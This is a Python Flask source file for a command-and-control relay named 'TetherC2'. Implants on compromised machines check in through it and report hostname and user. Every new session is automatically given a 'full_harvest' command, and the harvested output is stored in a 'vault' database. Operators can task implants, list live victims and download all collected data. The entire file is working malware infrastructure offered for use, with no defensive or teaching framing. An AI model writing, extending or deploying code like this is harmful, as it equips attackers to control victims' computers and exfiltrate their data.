# relay_server.py (Full Code - Final Stability Revamp)
import sqlite3
import json
import time
import threading
from flask import Flask, request, jsonify
from werkzeug.security import generate_password_hash, check_password_hash

# --- Configuration ---
DATABASE_FILE = "tether_global.db"
SESSION_TIMEOUT_SECONDS = 40

# --- In-Memory State (with Threading Locks) ---
command_queue = {}
response_queue = {}
active_sessions = {}
cmd_lock = threading.Lock()
res_lock = threading.Lock()
ses_lock = threading.Lock()

# --- Database Setup ---
def init_db():
    conn = sqlite3.connect(DATABASE_FILE)
    cursor = conn.cursor()
    cursor.execute("CREATE TABLE IF NOT EXISTS users (username TEXT PRIMARY KEY, password_hash TEXT NOT NULL)")
    cursor.execute("CREATE TABLE IF NOT EXISTS sessions (session_id TEXT PRIMARY KEY, owner_username TEXT NOT NULL, metadata TEXT, FOREIGN KEY (owner_username) REFERENCES users(username))")
    cursor.execute("CREATE TABLE IF NOT EXISTS vault (session_id TEXT, module_name TEXT, data TEXT, PRIMARY KEY (session_id, module_name))")
    conn.commit()
    conn.close()

def get_db_conn():
    conn = sqlite3.connect(DATABASE_FILE)
    conn.row_factory = sqlite3.Row
    return conn

# --- Flask App Initialization ---
app = Flask(__name__)

# --- Authentication Endpoints ---
@app.route('/auth/register', methods=['POST'])
def register():
    data = request.json
    username, password = data.get('username'), data.get('password')
    if not all([username, password]) or len(password) < 4:
        return jsonify({"success": False, "error": "Username and a password (min 4 chars) are required."}), 400
    
    conn = get_db_conn()
    try:
        conn.execute("INSERT INTO users (username, password_hash) VALUES (?, ?)", (username, generate_password_hash(password)))
        conn.commit()
        print(f"[RELAY] New user registered: {username}")
        return jsonify({"success": True, "message": "Account created successfully."})
    except sqlite3.IntegrityError:
        return jsonify({"success": False, "error": "Username already exists."}), 409
    finally:
        conn.close()

@app.route('/auth/login', methods=['POST'])
def login():
    data = request.json
    username, password = data.get('username'), data.get('password')
    conn = get_db_conn()
    user_row = conn.execute("SELECT * FROM users WHERE username = ?", (username,)).fetchone()
    conn.close()
    if user_row and check_password_hash(user_row['password_hash'], password):
        return jsonify({"success": True, "username": user_row['username']})
    else:
        return jsonify({"success": False, "error": "Invalid username or password."}), 401

# --- Implant Endpoints ---
@app.route('/implant/hello', methods=['POST'])
def handle_implant_hello():
    data = request.json
    session_id, c2_user = data.get("session_id"), data.get("c2_user")
    if not all([session_id, c2_user]):
        return jsonify({"error": "session_id and c2_user are required"}), 400
    
    conn = get_db_conn()
    cursor = conn.cursor()
    is_new_session = False
    
    with ses_lock:
        if session_id not in active_sessions:
            is_new_session = True
            print(f"[RELAY] New session online from user '{c2_user}': {session_id}")
        
        metadata = {"hostname": data.get("hostname"), "user": data.get("user")}
        cursor.execute("INSERT OR REPLACE INTO sessions (session_id, owner_username, metadata) VALUES (?, ?, ?)", (session_id, c2_user, json.dumps(metadata)))
        active_sessions[session_id] = {"owner": c2_user, "last_seen": time.time(), **metadata}
    
    if "results" in data:
        for result in data.get("results", []):
            if "command" in result and "output" in result:
                cursor.execute("INSERT OR REPLACE INTO vault (session_id, module_name, data) VALUES (?, ?, ?)", (session_id, result["command"], json.dumps(result["output"])))
    
    conn.commit()
    conn.close()

    with cmd_lock:
        if is_new_session:
            command_queue.setdefault(c2_user, {}).setdefault(session_id, []).append({"action": "full_harvest", "params": {}})
        commands_to_execute = command_queue.get(c2_user, {}).pop(session_id, [])
        
    return jsonify({"commands": commands_to_execute})

@app.route('/implant/response', methods=['POST'])
def handle_implant_response():
    data = request.json; session_id = data.get("session_id")
    with ses_lock: session_info = active_sessions.get(session_id)
    if session_info:
        with res_lock: response_queue.setdefault(session_info["owner"], {}).setdefault(session_id, []).append(data)
    return jsonify({"status": "ok"})

# --- C2 Controller Endpoints ---
@app.route('/c2/task', methods=['POST'])
def handle_c2_task():
    data = request.json; username, session_id, command = data.get("username"), data.get("session_id"), data.get("command")
    if not all([username, session_id, command]): return jsonify({"status": "error", "message": "Missing username, session_id, or command"}), 400
    with cmd_lock: command_queue.setdefault(username, {}).setdefault(session_id, []).append(command)
    return jsonify({"status": "ok"})

@app.route('/c2/discover', methods=['POST'])
def discover_sessions():
    username = request.json.get("username"); user_sessions = {}
    with ses_lock:
        for sid, data in active_sessions.items():
            if data["owner"] == username and (time.time() - data["last_seen"]) < SESSION_TIMEOUT_SECONDS:
                user_sessions[sid] = {"hostname": data["hostname"], "user": data["user"]}
    return jsonify({"sessions": user_sessions})
    
@app.route('/c2/get_responses', methods=['POST'])
def get_c2_responses():
    username, session_id = request.json.get("username"), request.json.get("session_id")
    with res_lock: responses = response_queue.get(username, {}).pop(session_id, [])
    return jsonify({"responses": responses})

@app.route('/c2/get_all_vault_data', methods=['POST'])
def get_all_vault_data():
    username = request.json.get("username")
    if not username: return jsonify({"success": False, "error": "Username is required"}), 400
    
    conn = get_db_conn()
    sessions = conn.execute("SELECT session_id, metadata FROM sessions WHERE owner_username = ?", (username,)).fetchall()
    
    vault_data = {}
    for session in sessions:
        sid, metadata_json = session['session_id'], session['metadata']
        vault_data[sid] = {"metadata": json.loads(metadata_json)}
        
        vault_items = conn.execute("SELECT module_name, data FROM vault WHERE session_id = ?", (sid,)).fetchall()
        for item in vault_items:
            vault_data[sid][item['module_name']] = json.loads(item['data'])

    conn.close()
    return jsonify({"success": True, "data": vault_data})

@app.route('/')
def index():
    return "TetherC2 Relay is operational."

if __name__ == '__main__':
    init_db()
    print("[RELAY] TetherC2 Relay is operational.")
    # This block is for local testing. Render will use a gunicorn command to run the app.
    app.run(host='0.0.0.0', port=5001)